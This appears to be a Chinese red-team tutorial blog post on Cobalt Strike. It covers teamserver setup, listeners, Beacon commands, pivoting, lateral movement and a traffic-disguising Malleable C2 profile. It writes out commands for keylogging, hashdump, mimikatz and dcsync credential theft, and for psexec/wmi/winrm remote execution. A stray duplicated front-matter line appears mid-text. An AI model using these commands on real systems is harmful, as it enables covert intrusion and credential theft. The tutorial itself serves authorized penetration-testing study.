---
title: Cobalt Strike基础使用
date: 2026-03-20 08:00:00
tags:
  - 工具
  - 渗透测试
categories: 渗透测试
description: Cobalt Strike 基础使用——TeamServer 搭建、Listener 配置、Beacon 命令与 Socks 代理内网穿透。
---

## 前言

Cobalt Strike（简称CS）是由Raphael Mudge开发的商业化渗透测试框架，将后渗透代理（Beacon）、横向移动、隐蔽隧道和报告生成整合在一起，是红队行动中最常用的C2平台之一。本文梳理CS的核心组件与基础使用方法。

## 一、Teamserver 部署

Teamserver是Cobalt Strike的服务端核心，所有Beacon回连到它。基本启动命令：

```bash
# 语法: ./teamserver <IP> <password> [/path/to/profile] [killdate]
sudo ./teamserver 192.168.1.100 mypassword myprofile.profile
```

参数说明：
- **IP**：公网或内网可达的服务端IP。
- **password**：客户端连接认证密码。
- **profile**：可选C2配置文件，用于伪装流量特征。
- **killdate**：可选有效期，格式YYYY-MM-DD。

description: Cobalt Strike 基础使用——TeamServer 搭建、Beacon 命令与 Socks 代理。
生产环境建议：使用强密码；定制Malleable C2 Profile；搭配CDN或域前置隐藏真实IP；用systemd或screen保持后台运行；合理设置killdate防止Beacon长期失控。客户端连接时填写host、port（默认50050）、password和用户名。

## 二、Listener 监听器类型

### 2.1 HTTP / HTTPS Listener

最常用的类型，Beacon通过HTTP/HTTPS请求回连C2。穿透性强，可配合域前置（Domain Fronting）。HTTPS提供传输加密，HTTP便于隐蔽在大量Web流量中。

### 2.2 DNS Listener

通过DNS隧道通信，适用于HTTP/HTTPS被严格封锁的环境。Beacon发送TXT/MX/A记录查询，请求携带加密任务数据，Teamserver通过DNS响应下发指令。速度较慢但隐蔽性极高，需提前配置NS记录指向Teamserver。

### 2.3 SMB Listener

使用命名管道在同一网段内点对点通信。不产生网络流量，需要已有上线主机作中转（Link Listener）。多个SMB Beacon可串联形成链式连接，适合无法直接出网的内网主机。

### 2.4 TCP Listener 与 External Listener

TCP Beacon通过原始TCP Socket通信作备用。External Listener用于将MSF等C2框架的session接入CS进行管理。

## 三、Beacon 常用命令

### 3.1 基础操作

| 命令 | 功能 |
|------|------|
| `sleep 5 0` | 设置休眠间隔（秒）和抖动率 |
| `jobs` / `jobkill <id>` | 查看/终止后台任务 |
| `exit` | 终止Beacon进程 |
| `note` | 为当前Beacon添加备注 |

### 3.2 信息收集与文件操作

| 命令 | 功能 |
|------|------|
| `shell <cmd>` | 执行CMD命令 |
| `powershell <cmd>` | 执行PowerShell命令 |
| `execute <program>` | 执行指定程序 |
| `pwd` / `cd` / `ls` | 基本目录操作 |
| `download <file>` / `upload <local> <remote>` | 文件下载/上传 |
| `ps` / `kill <pid>` | 进程列表/结束进程 |
| `getuid` | 获取当前用户身份 |

### 3.3 网络与域信息

| 命令 | 功能 |
|------|------|
| `net view` / `net computers` | 列出域内计算机 |
| `net dclist` | 列出域控制器 |
| `net user` / `net group` | 列出域用户/组 |

### 3.4 凭据操作

| 命令 | 功能 |
|------|------|
| `hashdump` | 导出本地SAM哈希 |
| `mimikatz <cmd>` | 执行Mimikatz命令 |
| `logonpasswords` | 用Mimikatz导出明文凭据 |
| `dcsync <domain>` | DCSync攻击导出域控哈希 |
| `steal_token <pid>` / `rev2self` | 窃取/恢复进程令牌 |
| `make_token <user> <domain> <pass>` | 创建模拟令牌 |

### 3.5 权限提升

| 命令 | 功能 |
|------|------|
| `elevate <exploit> <listener>` | 使用内置提权Exploit |
| `getsystem` | 尝试获取SYSTEM权限 |
| `runasadmin <exploit> <cmd>` | 以管理员权限执行命令 |

`elevate`支持uac-token-duplication、uac-eventvwr、svc-exe等内置技术。

## 四、Keystroke、Screenshot 与 Hashdump

### 4.1 键盘记录 (keylogger)

```text
beacon> keylogger <pid>    # 对指定进程注入键盘记录器
beacon> jobs               # 查看后台键盘记录任务状态
```

通过SetWindowsHookEx注入目标进程记录键盘输入，适用于捕获凭据和敏感信息。需注意x86/x64位匹配。

### 4.2 屏幕截图 (screenshot)

```text
beacon> screenshot <pid>   # 对指定进程注入截图模块
beacon> screenwatch        # 定时截图并回传
```

通过PrintWindow API实现，单次截图为JPEG格式回传。screenwatch以固定间隔截图方便监控用户桌面。

### 4.3 哈希导出 (hashdump)

```text
beacon> hashdump           # 导出本地SAM的NTLM哈希
beacon> mimikatz sekurlsa::logonpasswords  # 从内存导出凭据
```

hashdump通过注入lsass.exe读取注册表SAM键值和SECURITY\Policy\Secrets提取NTLM哈希，需SYSTEM权限。配合Mimikatz可同时获取明文密码和Kerberos票据。

## 五、SOCKS 代理与 Pivoting

### 5.1 SOCKS代理

通过已上线Beacon进入目标内网，右键Beacon -> Pivoting -> SOCKS Server，设置代理端口（如1080）。配合Proxychains：

```bash
# /etc/proxychains.conf 添加
socks5 127.0.0.1 1080

proxychains nmap -sT -Pn 10.10.10.0/24
proxychains crackmapexec smb 10.10.10.0/24
```

### 5.2 其他Pivoting方式

| 方式 | 说明 |
|------|------|
| **Reverse Port Forward** | `rportfwd 3389 10.10.10.5 3389` 将内网端口映射到本地 |
| **Covert VPN** | 建立隐蔽VPN隧道接入内网 |
| **SMB/TCP Beacon链** | 使用SMB或TCP Beacon串联内网主机 |
| **SSH Session** | `ssh 10.10.10.5:22 user pass` 通过Beacon建立SSH连接 |

SOCKS代理最灵活，但速度受Beacon sleep时间影响较大，调整sleep可改善体验。

## 六、横向移动

Cobalt Strike提供丰富的横向移动命令。

### 6.1 jump 命令

高级横向移动命令，自动选择合适技术：

```text
beacon> jump <method> <target> <listener>
```

支持的method：`psexec`、`psexec64`、`psexec_psh`、`winrm`、`winrm64`、`wmi`、`wmi64`。

### 6.2 PsExec

```text
beacon> psexec <target> <listener>
beacon> psexec_psh <target> <listener>  # PowerShell免文件版
```

原理：通过SMB（445端口）连接ADMIN\$共享，上传服务可执行文件，创建并启动服务运行Payload后清理。需要目标管理员凭据。

### 6.3 WMI

```text
beacon> wmi <target> <listener>
```

通过DCOM/WMI接口远程执行命令（端口135及动态高端口）。优势：不落盘（Fileless）直接内存执行；不创建服务减少日志痕迹；通过wmiprvse.exe子进程执行，进程链自然。

### 6.4 WinRM

```text
beacon> winrm <target> <listener>
```

通过WinRM服务（5985 HTTP / 5986 HTTPS）远程执行命令。要求目标启用WinRM。使用WS-Management协议，相比PsExec更稳定且不易被杀软阻断。

另可通过 `remote-exec wmi/psexec/winrm <target> <cmd>` 直接执行任意系统命令。

## 七、C2 Profile（Malleable C2）

Malleable C2 Profile是CS最具特色的功能，允许自定义Beacon网络通信特征。核心配置示例：

```text
set sleeptime "5000";
set jitter "20";
set useragent "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36";
set pipename "msagent_##";

http-get {
    set uri "/api/v1/status";
    set verb "GET";
    client {
        header "Accept" "text/html,application/xhtml+xml,*/*";
        header "Host" "cdn.example.com";
        metadata {
            base64url;
            header "Cookie";
        }
    }
    server {
        header "Content-Type" "text/html";
        output { base64; print; }
    }
}

http-post {
    set uri "/api/v1/upload";
    set verb "POST";
    client {
        header "Content-Type" "application/octet-stream";
        id { parameter "id"; }
        output { base64; print; }
    }
    server { output { print; } }
}

post-ex {
    set spawnto_x86 "%windir%\\syswow64\\rundll32.exe";
    set spawnto_x64 "%windir%\\sysnative\\rundll32.exe";
}

stage {
    set userwx "false";
    set obfuscate "true";
    set smartinject "true";
}
```

主要配置块说明：

| 配置块 | 用途 |
|--------|------|
| `http-get` / `http-post` | 定义HTTP通信请求/响应格式 |
| `http-stager` | Stager下载Payload的HTTP格式 |
| `https-certificate` | TLS证书配置 |
| `dns-beacon` | DNS Beacon行为配置 |
| `post-ex` | 后渗透任务（如mimikatz）注入行为 |
| `stage` | Payload内存加载行为 |
| `process-inject` | 进程注入技术选择 |

Profile验证命令：`./c2lint example.profile`，检查语法正确性和字段合法性。

## 八、Cobalt Strike vs Metasploit 对比

| 对比维度 | Cobalt Strike | Metasploit Framework |
|----------|--------------|---------------------|
| **定位** | 红队/C2平台 | 通用渗透测试框架 |
| **许可证** | 商业授权（付费） | BSD开源许可 |
| **C2架构** | 成熟多协议C2（HTTP/DNS/SMB/TCP） | Meterpreter为主 |
| **隐蔽性** | 高度可定制（Malleable C2） | 基础流量特征易识别 |
| **横向移动** | 内置丰富命令，自动化程度高 | 需手动组合模块 |
| **协作能力** | 多用户协作、共享session | 单用户为主 |
| **Malleable C2** | 支持，核心特色 | 不支持 |
| **SOCKS代理** | 一键开启，稳定可靠 | 通过auxiliary模块 |
| **免杀能力** | 需搭配Artifact Kit自定义 | 模板固定，易被查杀 |
| **报告功能** | 内置报告生成 | 需第三方工具 |
| **学习曲线** | 中等 | 较低，社区资源丰富 |
| **适用场景** | APT模拟、红蓝对抗、实战演练 | 漏洞利用、渗透测试、安全研究 |

总结：MSF适合漏洞利用和入门学习；CS更适合高级红队行动，尤其面对防御体系成熟的目标。

## 九、免责声明

本文所述内容仅限以下合法场景：

1. **授权渗透测试**：获得目标方书面授权后进行的安全评估。
2. **红蓝对抗演练**：受控环境下的组织内部攻防演练。
3. **安全研究与教育**：隔离实验室环境中的学习与研究。
4. **自查自测**：对自己拥有合法权限的系统进行安全检测。

**严禁将本文技术用于任何未授权的计算机系统访问、数据窃取或破坏活动。**

《中华人民共和国网络安全法》第二十七条规定，任何个人和组织不得从事非法侵入他人网络、干扰他人网络正常功能、窃取网络数据等危害网络安全的活动。《中华人民共和国刑法》第二百八十五条、第二百八十六条规定了非法侵入计算机信息系统罪、破坏计算机信息系统罪的刑事责任。

任何未经授权的渗透测试行为均属违法，使用者需自行承担相应法律后果。

## 参考资料

- Cobalt Strike官方文档：https://www.cobaltstrike.com/
- Malleable C2 Profile语法参考
- MITRE ATT&CK框架对应技术
